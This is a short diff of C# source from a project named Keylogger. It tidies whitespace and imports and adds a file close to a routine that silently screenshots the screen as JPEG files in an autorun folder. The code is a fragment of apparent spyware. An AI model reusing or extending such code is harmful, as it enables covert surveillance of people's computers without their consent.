@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Collections;
 using System.ComponentModel;
 using System.IO;
 using System.Windows;
@@ -10,7 +9,6 @@ using System.Drawing;
 using System.Windows.Interop;
 using System.Collections.Generic;
 using System.Diagnostics;
-
 
 namespace Keylogger
 {
@@ -398,16 +396,18 @@ namespace Keylogger
         {
             string path = AutoRun.Path() + numscreen + ".jpg";
            // string path = AutoRun.Path() +  "Key.rtf";
-
+            
+            
             bitmapsource = ScreenShot.TakeScreen();
             jpeg = new JpegBitmapEncoder();
             jpeg.Frames.Add(BitmapFrame.Create(bitmapsource));
             FileStream fs = null;
-
             try
             {
-                fs = new FileStream(path,FileMode.Create, FileAccess.Write);
+                fs = new FileStream(path, FileMode.Create, FileAccess.Write);
                 jpeg.Save(fs);
+                fs.Close();
+
             }
 
             catch (Exception ex)
